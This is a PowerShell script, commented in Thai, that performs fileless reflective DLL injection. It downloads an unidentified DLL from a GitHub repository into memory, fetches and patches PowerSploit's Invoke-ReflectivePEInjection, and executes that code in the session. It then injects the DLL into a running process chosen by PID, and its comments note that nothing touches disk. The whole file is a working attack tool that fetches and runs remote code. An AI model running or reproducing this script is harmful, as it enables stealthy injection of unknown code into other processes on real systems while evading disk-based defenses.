# inject_fileless.ps1 - ไม่มีการเขียนไฟล์ลงดิสก์
# โหลด DLL และ PowerSploit ไว้ในหน่วยความจำทั้งหมด

# กำหนด URL DLL ของคุณ
$dllUrl = "https://raw.githubusercontent.com/newgen319/xxx_x1/refs/heads/main/xxx_x1_x64.dll"

# ดาวน์โหลด DLL เข้าสู่หน่วยความจำ (ไม่เขียนไฟล์)
Write-Host "[*] Loading DLL into memory..." -ForegroundColor Cyan
$dllBytes = (Invoke-WebRequest -Uri $dllUrl -UseBasicParsing).Content
Write-Host "[+] DLL loaded: $($dllBytes.Length) bytes" -ForegroundColor Green

# ดาวน์โหลด PowerSplift เข้าสู่หน่วยความจำ (ไม่เขียนไฟล์)
Write-Host "[*] Loading PowerSploit into memory..." -ForegroundColor Cyan
$ps1Content = (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1" -UseBasicParsing).Content

# แก้ไขให้ compatible กับ PowerShell 5.1+ (ในหน่วยความจำ)
$ps1Content = $ps1Content -replace '\$GetProcAddress\s*=\s*\$UnsafeNativeMethods\.GetMethod\(''GetProcAddress''\)', '$GetProcAddress = $UnsafeNativeMethods.GetMethod(''GetProcAddress'', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))'
$ps1Content = $ps1Content -replace '\$GetModuleHandle\s*=\s*\$UnsafeNativeMethods\.GetMethod\(''GetModuleHandle''\)', '$GetModuleHandle = $UnsafeNativeMethods.GetMethod(''GetModuleHandle'', [Type[]]@([String]))'

# โหลดฟังก์ชันเข้าสู่ PowerShell session (ไม่เขียนไฟล์)
$scriptBlock = [ScriptBlock]::Create($ps1Content)
. $scriptBlock
Write-Host "[+] Reflective injection function loaded in memory" -ForegroundColor Green

# แสดง processes ให้เลือก
Write-Host "`n[*] Running processes:" -ForegroundColor Cyan
Get-Process | Select-Object Id, ProcessName, @{N='Memory(MB)';E={[math]::Round($_.WorkingSet64/1MB,2)}} | 
    Sort-Object Id | Format-Table -AutoSize

# รับ PID
$targetPid = Read-Host "`n[*] Enter target PID"

# ตรวจสอบและฉีด (ทั้งหมดอยู่ในหน่วยความจำ)
$targetProcess = Get-Process -Id $targetPid -ErrorAction SilentlyContinue
if ($targetProcess) {
    Write-Host "[*] Target: $($targetProcess.ProcessName) (PID: $targetPid)" -ForegroundColor Yellow
    Write-Host "[*] Injecting from memory..." -ForegroundColor Cyan
    
    Invoke-ReflectivePEInjection -PEBytes $dllBytes -ProcId $targetPid
    
    Write-Host "[+] Injection completed!" -ForegroundColor Green
} else {
    Write-Host "[!] PID $targetPid not found" -ForegroundColor Red
}

# ไม่มีการ cleanup เพราะไม่มีไฟล์ถูกสร้าง
Write-Host "[*] No files written to disk - all operations in memory" -ForegroundColor Cyan
